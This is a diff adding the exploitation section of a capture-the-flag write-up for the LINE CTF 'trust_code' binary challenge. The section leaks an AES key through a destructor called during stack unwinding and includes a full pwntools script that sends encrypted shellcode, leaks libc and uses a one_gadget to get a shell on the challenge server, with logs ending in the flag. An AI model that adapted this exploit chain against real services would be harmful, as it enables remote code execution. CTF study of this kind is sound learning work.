@@ -263,7 +263,177 @@ LAB_00101522:
   } while( true );
 }
 ```  
-Our code has 0x10 bytes that is the `TRUST_CODE_ONLY!` signature and the executed part `0x20` bytes that has to go through that check. What the check does is, find if there is opcode like `0x0f` or `0x05` in our payload. Because `\x0f\x05` is actually `syscall`. This kind of sanitization is quite easy to bypass.
+Our code has 0x10 bytes that is the `TRUST_CODE_ONLY!` signature and the executed part `0x20` bytes that has to go through that check. What the check does is, find if there is opcode like `0x0f` or `0x05` in our payload. Because `\x0f\x05` is actually `syscall`. This kind of sanitization is quite easy to bypass.  
+  
+## Exploitation  
+  
+To leak the `secret_key` we will abuse the fact that when `__cxa_throw` there is the process of stack unwinding happening, which will call the deconstructor of all objects in the called function. My knowledge on this process is quite limited. I guess  that it uses the saved `rip` on the stack to find where the function is? And then to determine what deconstructor to call?  
+There is a `Shellcode` deconstructor that write `0x20` bytes from address into `stdout`  
+```c
+void __thiscall Shellcode::~Shellcode(Shellcode *this)
 
+{
+  long lVar1;
+  long in_FS_OFFSET;
+  
+  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
+  puts("\n= Executed =");
+  write(1,this,0x20);
+  *(undefined (*) [16])(this + 0x10) = ZEXT816(0);
+  *(undefined (*) [16])this = ZEXT816(0);
+  if (*(long *)(in_FS_OFFSET + 0x28) == lVar1) {
+    return;
+  }
+                    /* WARNING: Subroutine does not return */
+  __stack_chk_fail();
+}
+```  
+With this, i made a guess to overwrite the last 2 bytes of saved `rip` on the stack with the address after `execute`. This part:  
+```c
+  uStack12 = *(undefined4 *)(lVar1 + 0x2c);
+  execute((uchar *)&local_28);
+  Shellcode::~Shellcode((Shellcode *)&local_28);
+```
+And hopefully, it will call the `Shellcode` deconstructor second time, with a different pointer `this` and will print out something. Here's the result:  
+```console
+┌──(kali㉿kali)-[~/Desktop/pwn/linectf/trust]
+└─$ python2 solve.py
+[+] Opening connection to 35.190.227.47 on port 10009: Done
+[DEBUG] Received 0x4 bytes:
+    'iv> '
+[DEBUG] Sent 0x1a bytes:
+    'AAAAAAAAAAAAAAAAAAAAAAAAZV'
+[DEBUG] Received 0x6 bytes:
+    'code> '
+[DEBUG] Sent 0x30 bytes:
+    'TRUST_CODE_ONLY!TRUST_CODE_ONLY!TRUST_CODE_ONLY!'
+[+] Receiving all data: Done (165B)
+[DEBUG] Received 0xa5 bytes:
+    00000000  0a 3d 20 45  78 65 63 75  74 65 64 20  3d 0a 00 00  │·= E│xecu│ted │=···│
+    00000010  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
+    00000020  00 00 00 00  00 00 00 00  00 00 00 00  00 00 0a 3d  │····│····│····│···=│
+    00000030  20 45 78 65  63 75 74 65  64 20 3d 0a  00 1c 01 00  │ Exe│cute│d =·│····│
+    00000040  00 00 00 00  79 00 00 00  c1 60 00 00  76 30 6e 56  │····│y···│·`··│v0nV│
+    00000050  61 64 7a 6e  68 78 6e 76  24 6e 70 68  0a 53 6f 72  │adzn│hxnv│$nph│·Sor│
+    00000060  72 79 20 66  6f 72 20 74  68 65 20 69  6e 63 6f 6e  │ry f│or t│he i│ncon│
+    00000070  76 65 6e 69  65 6e 63 65  2c 20 74 68  65 72 65 20  │veni│ence│, th│ere │
+    00000080  77 61 73 20  61 20 70 72  6f 62 6c 65  6d 20 77 68  │was │a pr│oble│m wh│
+    00000090  69 6c 65 20  64 65 63 72  79 70 74 69  6e 67 20 63  │ile │decr│ypti│ng c│
+    000000a0  6f 64 65 2e  0a                                     │ode.│·│
+    000000a5
+[*] Closed connection to 35.190.227.47 port 10009
+```  
+I had to run it several times, because of `PIE-enabled`, the last byte is unchanged, but the second last byte changes everytime.  
+And indeed, the deconstructor was called twice, and we leaked the `secret_key`  
+`secret_key = v0nVadznhxnv$nph`  
+
+We are allowed to send as many payloads as possible, so there are many ways to exploit. Here's mine with ret2libc:  
+
+```python
+from pwn import *
+from Crypto.Cipher import AES
+
+context.arch = 'amd64'
+context.endian = 'little'
+context.bits = '64'
+
+REMOTE = True
+LOCAL = False
+if REMOTE:
+	p = remote('35.190.227.47',10009)
+if LOCAL:
+	p = gdb.debug('./trust_code')
+key = 'v0nVadznhxnv$nph'
+#My first payload was encrypted with iv = "\x00" 
+cipher1 = AES.new(key, AES.MODE_CBC,iv='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
+
+payload = '\x56\x90\xEC\x9A\xA4\xFB\x22\x9D\x3C\x1E\x3B\x74\xC1\x6E\x6C\xF3\x08\xA1\x49\xEB\x23\x5D\x96\x2C\xE9\x96\x2C\x40\x63\x23\x26\x6D\xA4\xC6\xFC\xEF\x74\x9C\x6E\x45\xFE\x01\xF8\x06\xCD\x7A\x98\x52'
+#Because we was provided with libc, my exploit is quite simple, first payload leak the libc address, and the second payload we will perfrom ret2libc with one_gadget
+
+#---LEAKING THE PUTS_LIBC ADDRESS WITH FIRST PAYLOAD---
+#We defeat PIE by using the address already on the stack, and use these offset:
+#puts_plt: 0x1110
+#ADR_LEAKED: 0x158d
+#puts_got: 0x7088
+
+p.sendafter('> ', '\x00'*0x18)
+p.sendafter('> ', payload)
+log.info("Sending payload:\n{}".format(hexdump(payload)))
+log.info("PAYLOAD:\n{}".format(disasm(cipher1.decrypt(payload)[17:] )))
+
+#---CALCULATE THE LIBC ADDRESS---
+puts_libc = u64(p.recv(6).ljust(8,"\x00"))
+base_libc = puts_libc - 0x84450
+log.info("Libc Base Address: " + hex(base_libc))
+one_gadget = base_libc + 0xe3b31
+
+#---RET2LIBC WITH SECOND PAYLOAD---
+p.sendafter('> ','n')
+cipher = AES.new(key, AES.MODE_CBC,iv='\xa4\xc6\xfc\xef\x74\x9c\x6e\x45\xfe\x01\xf8\x06\xcd\x7a\x98\x52')
+last_payload = "TRUST_CODE_ONLY!\x49\xB8" + p64(one_gadget) + "\x48\x31\xD2\x4D\x31\xFF\x41\x50\xC3"+ "\x90"*(32-19)
+enc = cipher.encrypt(last_payload)
+p.sendafter('> ', enc)
+log.info("Sending payload:\n{}".format(hexdump(enc)))
+log.info("PAYLOAD:\n{}".format(disasm(last_payload[16:] )))
+
+p.interactive()
+```  
+
+```console
+┌──(kali㉿kali)-[~/Desktop/pwn/linectf/trust]
+└─$ python2 solve.py
+[+] Opening connection to 35.190.227.47 on port 10009: Done
+[*] Sending payload:
+    00000000  56 90 ec 9a  a4 fb 22 9d  3c 1e 3b 74  c1 6e 6c f3  │V···│··"·│<·;t│·nl·│
+    00000010  08 a1 49 eb  23 5d 96 2c  e9 96 2c 40  63 23 26 6d  │··I·│#]·,│··,@│c#&m│
+    00000020  a4 c6 fc ef  74 9c 6e 45  fe 01 f8 06  cd 7a 98 52  │····│t·nE│····│·z·R│
+    00000030
+[*] PAYLOAD:
+       0:   8b 04 24                mov    eax, DWORD PTR [rsp]
+       3:   66 ba fb 5a             mov    dx, 0x5afb
+       7:   4c 89 c7                mov    rdi, r8
+       a:   48 01 d7                add    rdi, rdx
+       d:   49 c7 c5 78 5f 00 00    mov    r13, 0x5f78
+      14:   49 89 f9                mov    r9, rdi
+      17:   4d 29 e9                sub    r9, r13
+      1a:   41 ff d1                call   r9
+      1d:   90                      nop
+      1e:   c3                      ret
+[*] Libc Base Address: 0x7f77a6155000
+[*] Sending payload:
+    00000000  b5 a8 07 07  f2 a3 9b 7f  e6 00 5a c4  e1 88 a0 4d  │····│····│··Z·│···M│
+    00000010  22 b8 46 57  23 b9 85 83  47 fa 1c 82  2c 41 9a a8  │"·FW│#···│G···│,A··│
+    00000020  a8 a5 a2 a4  94 47 4b 5c  7b 52 a7 ea  31 8e 46 e2  │····│·GK\│{R··│1·F·│
+    00000030
+[*] PAYLOAD:
+       0:   49 b8 31 8b 23 a6 77    movabs r8, 0x7f77a6238b31
+       7:   7f 00 00 
+       a:   48 31 d2                xor    rdx, rdx
+       d:   4d 31 ff                xor    r15, r15
+      10:   41 50                   push   r8
+      12:   c3                      ret    
+      13:   90                      nop
+      14:   90                      nop
+      15:   90                      nop
+      16:   90                      nop
+      17:   90                      nop
+      18:   90                      nop
+      19:   90                      nop
+      1a:   90                      nop
+      1b:   90                      nop
+      1c:   90                      nop
+      1d:   90                      nop
+      1e:   90                      nop
+      1f:   90                      nop
+[*] Switching to interactive mode
+$ ls
+flag
+run.sh
+secret_key.txt
+trust_code
+$ cat flag
+LINECTF{I_5h0uld_n0t_trust_my_c0de}$  
+```  
+The flag is: `LINECTF{I_5h0uld_n0t_trust_my_c0de}`
 
 
